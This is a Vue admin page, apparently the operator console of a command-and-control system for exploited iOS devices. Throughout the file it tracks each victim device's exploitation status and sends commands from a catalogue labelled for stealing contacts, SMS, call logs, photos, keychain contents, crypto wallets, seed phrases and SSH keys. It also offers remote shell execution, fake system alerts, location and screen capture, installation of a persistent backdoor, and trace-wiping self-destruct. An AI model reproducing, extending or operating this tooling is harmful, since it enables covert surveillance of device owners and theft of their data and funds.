<template>
  <div class="page-container">
    <!-- Search & Filters -->
    <el-card shadow="never" class="filter-card">
      <el-form :inline="true" :model="filters" @submit.prevent>
        <el-form-item label="搜索">
          <el-input v-model="filters.search" placeholder="UUID/IP/型号" clearable @keyup.enter="loadData" style="width: 200px" />
        </el-form-item>
        <el-form-item label="状态">
          <el-select v-model="filters.status" placeholder="全部" clearable style="width: 120px">
            <el-option label="在线" value="online" />
            <el-option label="离线" value="offline" />
            <el-option label="活跃" value="active" />
          </el-select>
        </el-form-item>
        <el-form-item label="利用状态">
          <el-select v-model="filters.exploit_status" placeholder="全部" clearable style="width: 140px">
            <el-option label="未利用" value="none" />
            <el-option label="利用中" value="exploiting" />
            <el-option label="已利用" value="exploited" />
            <el-option label="失败" value="failed" />
          </el-select>
        </el-form-item>
        <el-form-item label="渠道">
          <el-select v-model="filters.channel_id" placeholder="全部" clearable filterable style="width: 150px">
            <el-option v-for="c in channels" :key="c.id" :label="c.name" :value="c.id" />
          </el-select>
        </el-form-item>
        <el-form-item label="分组">
          <el-select v-model="filters.group_id" placeholder="全部" clearable filterable style="width: 150px">
            <el-option v-for="g in groups" :key="g.id" :label="g.name" :value="g.id" />
          </el-select>
        </el-form-item>
        <el-form-item label="启用">
          <el-select v-model="filters.enabled" placeholder="全部" clearable style="width: 100px">
            <el-option label="启用" :value="true" />
            <el-option label="禁用" :value="false" />
          </el-select>
        </el-form-item>
        <el-form-item>
          <el-button type="primary" @click="loadData">查询</el-button>
          <el-button @click="resetFilters">重置</el-button>
        </el-form-item>
      </el-form>
    </el-card>

    <!-- Table -->
    <el-card shadow="never" style="margin-top: 16px">
      <div class="table-toolbar">
        <div class="toolbar-left">
          <el-button-group>
            <el-button size="small" @click="batchOp('set-channel')" :disabled="!selectedRows.length">设置渠道</el-button>
            <el-button size="small" @click="batchOp('set-group')" :disabled="!selectedRows.length">设置分组</el-button>
            <el-button size="small" @click="batchOp('set-template')" :disabled="!selectedRows.length">设置模板</el-button>
            <el-button size="small" @click="batchOp('set-enabled')" :disabled="!selectedRows.length">启用/禁用</el-button>
            <el-button size="small" type="danger" @click="batchOp('delete')" :disabled="!selectedRows.length">批量删除</el-button>
          </el-button-group>
        </div>
        <div class="toolbar-right">
          <span v-if="selectedRows.length" style="color: #909399; margin-right: 10px">
            已选 {{ selectedRows.length }} 项
          </span>
        </div>
      </div>

      <el-table
        :data="tableData"
        v-loading="loading"
        border
        stripe
        @selection-change="onSelectionChange"
        @sort-change="onSortChange"
        style="width: 100%"
      >
        <el-table-column type="selection" width="50" />
        <el-table-column label="UUID" prop="device_uuid" min-width="200" show-overflow-tooltip>
          <template #default="{ row }">
            <el-link type="primary" @click="goDetail(row.device_uuid)">{{ row.device_uuid }}</el-link>
          </template>
        </el-table-column>
        <el-table-column label="型号" prop="device_model" width="120" sortable="custom">
          <template #default="{ row }">
            {{ row.device_model || '-' }}
          </template>
        </el-table-column>
        <el-table-column label="iOS版本" prop="os_version" width="100">
          <template #default="{ row }">
            <span v-if="row.os_version" style="font-weight: 600">{{ row.os_type === 'iOS' ? 'iOS ' : '' }}{{ row.os_version }}</span>
            <span v-else style="color: #c0c4cc">-</span>
          </template>
        </el-table-column>
        <el-table-column label="芯片" prop="chipset" width="160" show-overflow-tooltip>
          <template #default="{ row }">
            {{ row.chipset || '-' }}
          </template>
        </el-table-column>
        <el-table-column label="IP" prop="ip" width="130" />
        <el-table-column label="状态" prop="status" width="90" sortable="custom">
          <template #default="{ row }">
            <el-tag :type="statusTagType(row.status)" :effect="row.status === 'online' ? 'dark' : 'light'" size="small">
              {{ statusText(row.status) }}
            </el-tag>
          </template>
        </el-table-column>
        <el-table-column label="利用状态" prop="exploit_status" width="100">
          <template #default="{ row }">
            <el-tag :type="exploitTagType(row.exploit_status)" :effect="exploitEffect(row.exploit_status)" size="small">
              {{ exploitText(row.exploit_status) }}
            </el-tag>
          </template>
        </el-table-column>
        <el-table-column label="渠道" prop="channel_name" width="100" />
        <el-table-column label="分组" prop="group_name" width="100" />
        <el-table-column label="启用" prop="enabled" width="70">
          <template #default="{ row }">
            <el-switch
              :model-value="row.enabled == 1 || row.enabled === true"
              @change="(val: any) => toggleEnabled(row, val as boolean)"
            />
          </template>
        </el-table-column>
        <el-table-column label="最后活跃" prop="last_seen" width="170" sortable="custom">
          <template #default="{ row }">
            <span v-if="row.last_seen" :style="lastSeenStyle(row.last_seen)">
              {{ formatTime(row.last_seen) }}
            </span>
            <span v-else style="color: #c0c4cc">-</span>
          </template>
        </el-table-column>
        <el-table-column label="操作" width="260" fixed="right">
          <template #default="{ row }">
            <el-button text size="small" @click="goDetail(row.device_uuid)">详情</el-button>
            <el-button text size="small" type="warning" @click="sendCommand(row)">发命令</el-button>
            <el-dropdown trigger="click" @command="(cmd: string) => setExploitStatus(row, cmd)" style="margin-left: 4px">
              <el-button text size="small" :type="exploitTagType(row.exploit_status) === 'success' ? 'success' : 'info'">
                利用状态<el-icon class="el-icon--right"><ArrowDown /></el-icon>
              </el-button>
              <template #dropdown>
                <el-dropdown-menu>
                  <el-dropdown-item command="success" :disabled="row.exploit_status === 'success'">
                    <el-tag type="success" size="small" effect="dark">已利用</el-tag>
                    <span style="margin-left: 8px">标记 exploit 成功</span>
                  </el-dropdown-item>
                  <el-dropdown-item command="pending" :disabled="row.exploit_status === 'pending'">
                    <el-tag type="warning" size="small">待利用</el-tag>
                    <span style="margin-left: 8px">标记等待利用</span>
                  </el-dropdown-item>
                  <el-dropdown-item command="failed" :disabled="row.exploit_status === 'failed'">
                    <el-tag type="danger" size="small">失败</el-tag>
                    <span style="margin-left: 8px">标记利用失败</span>
                  </el-dropdown-item>
                  <el-dropdown-item command="unsupported" :disabled="row.exploit_status === 'unsupported'">
                    <el-tag type="info" size="small">不支持</el-tag>
                    <span style="margin-left: 8px">标记不支持</span>
                  </el-dropdown-item>
                </el-dropdown-menu>
              </template>
            </el-dropdown>
            <el-button text size="small" type="danger" @click="deleteDevice(row)">删除</el-button>
          </template>
        </el-table-column>
      </el-table>

      <!-- Pagination -->
      <el-pagination
        v-model:current-page="pagination.page"
        v-model:page-size="pagination.pageSize"
        :total="pagination.total"
        :page-sizes="[20, 50, 100]"
        layout="total, sizes, prev, pager, next, jumper"
        style="margin-top: 16px; justify-content: flex-end"
        @size-change="loadData"
        @current-change="loadData"
      />
    </el-card>

    <!-- Send Command Dialog -->
    <el-dialog v-model="cmdDialogVisible" title="发送命令" width="620px" @open="onCmdDialogOpen">
      <el-form label-position="top">
        <el-form-item label="目标设备">
          <el-input :model-value="cmdTarget?.device_uuid" disabled />
        </el-form-item>

        <el-form-item label="命令分类">
          <el-select v-model="cmdCategory" placeholder="选择命令分类" style="width: 100%" @change="onCategoryChange">
            <el-option v-for="cat in commandCategories" :key="cat.value" :label="cat.label" :value="cat.value">
              <span style="float: left">{{ cat.label }}</span>
              <span style="float: right; color: #909399; font-size: 12px">{{ cat.count }} 条</span>
            </el-option>
          </el-select>
        </el-form-item>

        <el-form-item v-if="cmdCategory" label="选择命令">
          <el-select v-model="cmdSelected" placeholder="选择具体命令" style="width: 100%" filterable @change="onCommandSelect">
            <el-option v-for="cmd in filteredCommands" :key="cmd.value" :label="cmd.label" :value="cmd.value">
              <span style="float: left">{{ cmd.label }}</span>
              <span style="float: right; color: #909399; font-size: 12px">{{ cmd.desc }}</span>
            </el-option>
          </el-select>
        </el-form-item>

        <el-form-item v-if="cmdNeedsPath" label="文件路径">
          <el-input v-model="cmdPath" :placeholder="cmdPathPlaceholder" />
        </el-form-item>

        <el-form-item v-if="cmdNeedsText" :label="cmdTextLabel">
          <el-input v-model="cmdText" :placeholder="cmdTextPlaceholder" />
        </el-form-item>

        <el-form-item v-if="cmdNeedsDepth" label="递归深度">
          <el-input-number v-model="cmdDepth" :min="1" :max="5" />
        </el-form-item>

        <el-form-item label="最终命令预览">
          <el-input :model-value="cmdPreview" type="textarea" :rows="2" readonly />
        </el-form-item>

        <el-alert v-if="cmdWarning" :title="cmdWarning" type="warning" show-icon :closable="false" style="margin-bottom: 12px" />
      </el-form>
      <template #footer>
        <el-button @click="cmdDialogVisible = false">取消</el-button>
        <el-button type="primary" :loading="cmdLoading" :disabled="!cmdPreview" @click="confirmSendCommand">发送命令</el-button>
      </template>
    </el-dialog>

    <!-- Batch Operation Dialog -->
    <el-dialog v-model="batchDialogVisible" :title="batchTitle" width="400px">
      <el-form label-position="top">
        <template v-if="batchAction === 'set-channel'">
          <el-form-item label="渠道">
            <el-select v-model="batchValue.channelId" placeholder="选择渠道" clearable filterable style="width: 100%">
              <el-option v-for="c in channels" :key="c.id" :label="c.name" :value="c.id" />
            </el-select>
          </el-form-item>
        </template>
        <template v-else-if="batchAction === 'set-group'">
          <el-form-item label="分组">
            <el-select v-model="batchValue.groupId" placeholder="选择分组" clearable filterable style="width: 100%">
              <el-option v-for="g in groups" :key="g.id" :label="g.name" :value="g.id" />
            </el-select>
          </el-form-item>
        </template>
        <template v-else-if="batchAction === 'set-template'">
          <el-form-item label="模板">
            <el-select v-model="batchValue.templateId" placeholder="选择模板" clearable filterable style="width: 100%">
              <el-option v-for="t in templates" :key="t.id" :label="t.name" :value="t.id" />
            </el-select>
          </el-form-item>
        </template>
        <template v-else-if="batchAction === 'set-enabled'">
          <el-form-item label="状态">
            <el-radio-group v-model="batchValue.enabled">
              <el-radio :value="true">启用</el-radio>
              <el-radio :value="false">禁用</el-radio>
            </el-radio-group>
          </el-form-item>
        </template>
        <template v-else-if="batchAction === 'delete'">
          <el-alert type="warning" :closable="false" show-icon>
            确定要删除选中的 {{ selectedRows.length }} 台设备吗？此操作不可撤销。
          </el-alert>
        </template>
      </el-form>
      <template #footer>
        <el-button @click="batchDialogVisible = false">取消</el-button>
        <el-button type="primary" :loading="batchLoading" @click="confirmBatchOp">确认</el-button>
      </template>
    </el-dialog>
  </div>
</template>

<script setup lang="ts">
import { ref, reactive, computed, onMounted, inject } from 'vue'
import { useRouter } from 'vue-router'
import { devicesApi, channelsApi, templatesApi, commandsApi } from '@/api/modules'
import { ElMessage, ElMessageBox } from 'element-plus'
import { ArrowDown } from '@element-plus/icons-vue'

const router = useRouter()
const withOtpRetry = inject('withOtpRetry') as <T>(fn: (otp?: string) => Promise<T>) => Promise<T>

const loading = ref(false)
const tableData = ref<any[]>([])
const selectedRows = ref<any[]>([])
const channels = ref<any[]>([])
const groups = ref<any[]>([])
const templates = ref<any[]>([])

const filters = reactive({
  search: '',
  status: '',
  exploit_status: '',
  channel_id: '' as string | number,
  group_id: '' as string | number,
  enabled: '' as string | boolean,
})

const sortParams = reactive({ sort: '', order: '' })

const pagination = reactive({
  page: 1,
  pageSize: 20,
  total: 0,
})

async function loadData() {
  loading.value = true
  try {
    const params: Record<string, any> = {
      skip: (pagination.page - 1) * pagination.pageSize,
      limit: pagination.pageSize,
      ...filters,
      ...sortParams,
    }
    // Clean up empty strings
    Object.keys(params).forEach((k) => {
      if (params[k] === '' || params[k] === undefined) delete params[k]
    })
    const res: any = await devicesApi.list(params)
    tableData.value = (res?.items || res || []).map((d: any) => ({
      ...d,
      enabled: d.enabled == 1 || d.enabled === true ? 1 : 0,
    }))
    pagination.total = res?.total ?? tableData.value.length
  } catch {
    // handled
  } finally {
    loading.value = false
  }
}

async function loadOptions() {
  try {
    const [chRes, grpRes, tplRes] = await Promise.all([
      channelsApi.list({ limit: 1000 }),
      devicesApi.groups(),
      templatesApi.list({ limit: 1000 }),
    ])
    channels.value = (chRes as any)?.items || (chRes as any) || []
    groups.value = (grpRes as any)?.items || (grpRes as any) || []
    templates.value = (tplRes as any)?.items || (tplRes as any) || []
  } catch {
    // ignore
  }
}

function resetFilters() {
  filters.search = ''
  filters.status = ''
  filters.exploit_status = ''
  filters.channel_id = ''
  filters.group_id = ''
  filters.enabled = ''
  pagination.page = 1
  loadData()
}

function onSelectionChange(rows: any[]) {
  selectedRows.value = rows
}

function onSortChange({ prop, order }: any) {
  if (prop && order) {
    sortParams.sort = prop
    sortParams.order = order === 'ascending' ? 'asc' : 'desc'
  } else {
    sortParams.sort = ''
    sortParams.order = ''
  }
  loadData()
}

function goDetail(uuid: string) {
  router.push(`/devices/${uuid}`)
}

function statusTagType(status: string): any {
  const map: Record<string, string> = { online: 'success', offline: 'info', active: 'warning' }
  return map[status] || 'info'
}

function statusText(status: string) {
  const map: Record<string, string> = { online: '在线', offline: '离线', active: '活跃' }
  return map[status] || status || '-'
}

function exploitTagType(status: string): any {
  const map: Record<string, string> = {
    pending: 'warning',
    success: 'success',
    exploiting: 'warning',
    exploited: 'success',
    failed: 'danger',
    unsupported: 'info',
    none: 'info',
  }
  return map[status] || 'info'
}

function exploitEffect(status: string): any {
  if (status === 'success' || status === 'exploited') return 'dark'
  return 'light'
}

function exploitText(status: string) {
  const map: Record<string, string> = {
    pending: '待利用',
    success: '已利用',
    exploiting: '利用中',
    exploited: '已利用',
    failed: '失败',
    unsupported: '不支持',
    none: '未利用',
  }
  return map[status] || status || '-'
}

function formatTime(time: string): string {
  if (!time) return '-'
  const d = new Date(time)
  if (isNaN(d.getTime())) return time
  const now = new Date()
  const diff = now.getTime() - d.getTime()
  const minutes = Math.floor(diff / 60000)
  const hours = Math.floor(diff / 3600000)
  const days = Math.floor(diff / 86400000)
  if (minutes < 1) return '刚刚'
  if (minutes < 60) return `${minutes}分钟前`
  if (hours < 24) return `${hours}小时前`
  if (days < 30) return `${days}天前`
  const mm = String(d.getMonth() + 1).padStart(2, '0')
  const dd = String(d.getDate()).padStart(2, '0')
  const hh = String(d.getHours()).padStart(2, '0')
  const mi = String(d.getMinutes()).padStart(2, '0')
  return `${mm}-${dd} ${hh}:${mi}`
}

function lastSeenStyle(time: string): Record<string, string> {
  if (!time) return {}
  const diff = Date.now() - new Date(time).getTime()
  if (diff < 5 * 60 * 1000) return { color: '#67c23a', fontWeight: '600' }       // 5分钟内 - 绿色
  if (diff < 60 * 60 * 1000) return { color: '#e6a23c', fontWeight: '500' }      // 1小时内 - 橙色
  if (diff < 24 * 60 * 60 * 1000) return { color: '#909399' }                    // 1天内 - 灰色
  return { color: '#c0c4cc' }                                                     // 超过1天 - 浅灰
}

async function toggleEnabled(row: any, val: boolean) {
  try {
    await withOtpRetry((otp) => devicesApi.patch(row.device_uuid, { enabled: val }, otp))
    ElMessage.success(val ? '已启用' : '已禁用')
    row.enabled = val ? 1 : 0
  } catch {
    // revert on failure
    row.enabled = val ? 0 : 1
  }
}

async function setExploitStatus(row: any, status: string) {
  const statusLabel: Record<string, string> = {
    success: '已利用',
    pending: '待利用',
    failed: '失败',
    unsupported: '不支持',
  }
  try {
    await ElMessageBox.confirm(
      `确定要将设备 ${row.device_uuid} 的利用状态标记为「${statusLabel[status] || status}」吗？\n\n标记为「已利用」后即可对该设备下发所有命令。`,
      '确认修改利用状态',
      { confirmButtonText: '确认', cancelButtonText: '取消', type: 'warning' }
    )
    await withOtpRetry((otp) => devicesApi.patch(row.device_uuid, { exploit_status: status }, otp))
    row.exploit_status = status
    ElMessage.success(`利用状态已标记为：${statusLabel[status] || status}`)
  } catch {
    // cancelled or error
  }
}

// Delete single device
async function deleteDevice(row: any) {
  try {
    await ElMessageBox.confirm(`确定要删除设备 ${row.device_uuid} 吗？`, '确认删除', {
      confirmButtonText: '删除',
      cancelButtonText: '取消',
      type: 'warning',
    })
    await withOtpRetry((otp) => devicesApi.delete(row.device_uuid, otp))
    ElMessage.success('删除成功')
    loadData()
  } catch {
    // cancelled or error
  }
}

// ==================== Command Selector ====================
// 命令分类与定义
interface CmdDef {
  value: string        // 命令标识（用于生成最终命令）
  label: string        // 中文显示名
  desc: string         // 简短说明
  category: string     // 分类
  needsPath?: boolean  // 是否需要文件路径参数
  pathPlaceholder?: string
  pathDefault?: string
  needsText?: boolean  // 是否需要文本参数（如弹窗内容）
  textLabel?: string
  textPlaceholder?: string
  textDefault?: string
  needsDepth?: boolean // 是否需要递归深度
  depthDefault?: number
  noArgs?: boolean     // 无参数命令
  warning?: string     // 警告提示
}

const commandCategories = [
  { value: 'exfil',   label: '数据窃取', count: 0 },
  { value: 'wallet',  label: '钱包/密钥', count: 0 },
  { value: 'file',    label: '文件操作', count: 0 },
  { value: 'shell',   label: 'Shell 执行', count: 0 },
  { value: 'ui',      label: 'UI 交互', count: 0 },
  { value: 'recon',   label: '侦察/信息', count: 0 },
  { value: 'persist', label: '持久化/控制', count: 0 },
]

const allCommands: CmdDef[] = [
  // ---- 数据窃取 ----
  { value: 'ds_exfil_contacts', label: '窃取通讯录', desc: 'AddressBook.sqlitedb', category: 'exfil', noArgs: true },
  { value: 'ds_exfil_sms',      label: '窃取短信记录', desc: 'sms.db', category: 'exfil', noArgs: true },
  { value: 'ds_exfil_calls',    label: '窃取通话记录', desc: 'call_history.db', category: 'exfil', noArgs: true },
  { value: 'ds_exfil_photos',   label: '窃取相册照片', desc: 'DCIM 目录递归', category: 'exfil', noArgs: true },
  { value: 'ds_exfil_wifi',     label: '窃取 WiFi 配置', desc: 'com.apple.wifi.plist', category: 'exfil', noArgs: true },
  { value: 'ds_exfil_files',    label: '窃取用户文件', desc: '/private/var/mobile 递归3层', category: 'exfil', noArgs: true },
  { value: 'ds_exfil_keychain', label: '导出钥匙串', desc: 'Keychain dump', category: 'exfil', noArgs: true },
  { value: 'ds_notes',          label: '窃取备忘录', desc: 'notes.sqlite', category: 'exfil', noArgs: true },
  { value: 'ds_history',        label: '窃取浏览器历史', desc: 'Safari History.db', category: 'exfil', noArgs: true },
  { value: 'ds_voice_memos',    label: '窃取语音备忘录', desc: 'Recordings 目录', category: 'exfil', noArgs: true },

  // ---- 钱包/密钥 ----
  { value: 'ds_exfil_wallet',   label: '扫描所有加密钱包', desc: '14种钱包类型', category: 'wallet', noArgs: true, warning: '此命令会扫描设备上所有已安装的加密货币钱包' },
  { value: 'ds_wallets',        label: '导出所有钱包数据', desc: 'wallet.scan.all', category: 'wallet', noArgs: true },
  { value: 'ds_privkey',        label: '读取 SSH 私钥', desc: '~/.ssh/id_rsa', category: 'wallet', noArgs: true },
  { value: 'ds_phrase',         label: '读取助记词数据库', desc: 'phrase.db', category: 'wallet', noArgs: true },

  // ---- 文件操作 ----
  { value: 'ds_file_ls',        label: '列出目录', desc: 'file.list', category: 'file', needsPath: true, pathPlaceholder: '目录路径，如 /private/var/mobile', pathDefault: '/private/var/mobile' },
  { value: 'ds_file_read',      label: '读取文件', desc: 'file.read', category: 'file', needsPath: true, pathPlaceholder: '文件路径，如 /etc/passwd' },
  { value: 'ds_file_download',  label: '下载文件', desc: 'file.read', category: 'file', needsPath: true, pathPlaceholder: '文件完整路径' },
  { value: 'ds_file_recursive', label: '递归列目录', desc: 'file.recursive', category: 'file', needsPath: true, needsDepth: true, pathPlaceholder: '目录路径', pathDefault: '/private/var/mobile', depthDefault: 3 },
  { value: 'ds_file_stat',      label: '文件属性', desc: 'stat', category: 'file', needsPath: true, pathPlaceholder: '文件/目录路径', pathDefault: '/private/var/mobile' },

  // ---- Shell 执行 ----
  { value: 'ds_shell',          label: '执行 Shell 命令', desc: 'shell.exec', category: 'shell', needsText: true, textLabel: 'Shell 命令', textPlaceholder: '如 whoami / ls -la /var' },
  { value: 'ds_exec',           label: '执行程序', desc: 'shell.exec', category: 'shell', needsText: true, textLabel: '程序及参数', textPlaceholder: '如 ps aux' },
  { value: 'ds_apps',           label: '列出已安装应用', desc: 'ls Application', category: 'shell', noArgs: true },

  // ---- UI 交互 ----
  { value: 'ds_alert',          label: '弹窗警告', desc: 'ui.alert', category: 'ui', needsText: true, textLabel: '弹窗内容', textPlaceholder: '如：系统需要更新', textDefault: '系统通知' },
  { value: 'ds_notify',         label: '系统通知', desc: 'ui.notify', category: 'ui', needsText: true, textLabel: '通知内容', textPlaceholder: '如：发现新版本', textDefault: '系统通知' },
  { value: 'ds_vibrate',        label: '震动设备', desc: 'ui.vibrate', category: 'ui', noArgs: true },
  { value: 'ds_location',       label: '获取地理位置', desc: 'geo.location', category: 'ui', noArgs: true },

  // ---- 侦察/信息 ----
  { value: 'ds_info',           label: '设备完整信息', desc: 'system.info', category: 'recon', noArgs: true },
  { value: 'ds_sysinfo',        label: '系统信息', desc: 'system.info', category: 'recon', noArgs: true },
  { value: 'ds_device',         label: '设备型号', desc: 'system.info', category: 'recon', noArgs: true },
  { value: 'ds_memory_dump',    label: '内存转储', desc: 'memory.dump', category: 'recon', noArgs: true },
  { value: 'ds_screenshot',     label: '截取屏幕', desc: 'screenshot', category: 'recon', noArgs: true },

  // ---- 持久化/控制 ----
  { value: 'install_persist',   label: '安装持久化', desc: 'install_persist', category: 'persist', noArgs: true, warning: '此命令将在设备上安装持久化后门，请谨慎使用' },
  { value: 'persist_check',     label: '检查持久化状态', desc: 'persist_check', category: 'persist', noArgs: true },
  { value: 'persist_remove',    label: '移除持久化', desc: 'persist_remove', category: 'persist', noArgs: true },
  { value: 'self_destruct',     label: '自毁/清理痕迹', desc: 'self_destruct', category: 'persist', noArgs: true, warning: '此命令将清除所有利用痕迹，不可逆' },
]

// 更新分类计数
commandCategories.forEach((cat) => {
  cat.count = allCommands.filter((c) => c.category === cat.value).length
})

const cmdCategory = ref('')
const cmdSelected = ref('')
const cmdPath = ref('')
const cmdText = ref('')
const cmdDepth = ref(3)

const filteredCommands = computed(() => {
  if (!cmdCategory.value) return []
  return allCommands.filter((c) => c.category === cmdCategory.value)
})

const currentCmdDef = computed(() => {
  return allCommands.find((c) => c.value === cmdSelected.value)
})

const cmdNeedsPath = computed(() => !!currentCmdDef.value?.needsPath)
const cmdNeedsText = computed(() => !!currentCmdDef.value?.needsText)
const cmdNeedsDepth = computed(() => !!currentCmdDef.value?.needsDepth)
const cmdPathPlaceholder = computed(() => currentCmdDef.value?.pathPlaceholder || '')
const cmdTextLabel = computed(() => currentCmdDef.value?.textLabel || '文本参数')
const cmdTextPlaceholder = computed(() => currentCmdDef.value?.textPlaceholder || '')
const cmdWarning = computed(() => currentCmdDef.value?.warning || '')

const cmdPreview = computed(() => {
  const def = currentCmdDef.value
  if (!def) return ''
  let cmd = def.value
  if (def.needsPath && cmdPath.value) {
    cmd += ' ' + cmdPath.value
  } else if (def.needsPath && def.pathDefault && !cmdPath.value) {
    cmd += ' ' + def.pathDefault
  }
  if (def.needsDepth) {
    cmd += ' ' + (cmdDepth.value || def.depthDefault || 3)
  }
  if (def.needsText && cmdText.value) {
    cmd += ' ' + cmdText.value
  } else if (def.needsText && def.textDefault && !cmdText.value) {
    cmd += ' ' + def.textDefault
  }
  return cmd
})

function onCmdDialogOpen() {
  cmdCategory.value = ''
  cmdSelected.value = ''
  cmdPath.value = ''
  cmdText.value = ''
  cmdDepth.value = 3
}

function onCategoryChange() {
  cmdSelected.value = ''
  cmdPath.value = ''
  cmdText.value = ''
  cmdDepth.value = 3
}

function onCommandSelect() {
  const def = currentCmdDef.value
  if (!def) return
  cmdPath.value = def.pathDefault || ''
  cmdText.value = def.textDefault || ''
  cmdDepth.value = def.depthDefault || 3
}

// ==================== Send Command ====================
const cmdDialogVisible = ref(false)
const cmdTarget = ref<any>(null)
const cmdLoading = ref(false)

function sendCommand(row: any) {
  cmdTarget.value = row
  onCmdDialogOpen()
  cmdDialogVisible.value = true
}

async function confirmSendCommand() {
  if (!cmdPreview.value) {
    ElMessage.warning('请先选择命令')
    return
  }
  cmdLoading.value = true
  try {
    await withOtpRetry((otp) => commandsApi.create({ command: cmdPreview.value, device_uuid: cmdTarget.value.device_uuid }, otp))
    ElMessage.success('命令已发送')
    cmdDialogVisible.value = false
  } catch {
    // handled
  } finally {
    cmdLoading.value = false
  }
}

// Batch operations
const batchDialogVisible = ref(false)
const batchAction = ref('')
const batchLoading = ref(false)
const batchValue = reactive({
  channelId: null as number | null,
  groupId: null as number | null,
  templateId: null as number | null,
  enabled: true,
})

const batchTitle = computed(() => {
  const map: Record<string, string> = {
    'set-channel': '批量设置渠道',
    'set-group': '批量设置分组',
    'set-template': '批量设置模板',
    'set-enabled': '批量启用/禁用',
    delete: '批量删除',
  }
  return map[batchAction.value] || '批量操作'
})

function batchOp(action: string) {
  if (!selectedRows.value.length) return
  batchAction.value = action
  batchValue.channelId = null
  batchValue.groupId = null
  batchValue.templateId = null
  batchValue.enabled = true
  batchDialogVisible.value = true
}

async function confirmBatchOp() {
  const uuids = selectedRows.value.map((r) => r.device_uuid)
  batchLoading.value = true
  try {
    await withOtpRetry(async (otp) => {
      if (batchAction.value === 'delete') {
        await devicesApi.batchDelete(uuids, otp)
      } else if (batchAction.value === 'set-channel') {
        await devicesApi.batchSetChannel(uuids, batchValue.channelId ?? undefined, otp)
      } else if (batchAction.value === 'set-group') {
        await devicesApi.batchSetGroup(uuids, batchValue.groupId ?? undefined, otp)
      } else if (batchAction.value === 'set-template') {
        await devicesApi.batchSetTemplate(uuids, batchValue.templateId ?? undefined, otp)
      } else if (batchAction.value === 'set-enabled') {
        await devicesApi.batchSetEnabled(uuids, batchValue.enabled, otp)
      }
    })
    ElMessage.success('操作成功')
    batchDialogVisible.value = false
    loadData()
  } catch {
    // handled
  } finally {
    batchLoading.value = false
  }
}

onMounted(() => {
  loadOptions()
  loadData()
})
</script>

<style scoped>
.filter-card .el-form-item {
  margin-bottom: 10px;
}
.table-toolbar {
  display: flex;
  justify-content: space-between;
  margin-bottom: 12px;
}
</style>
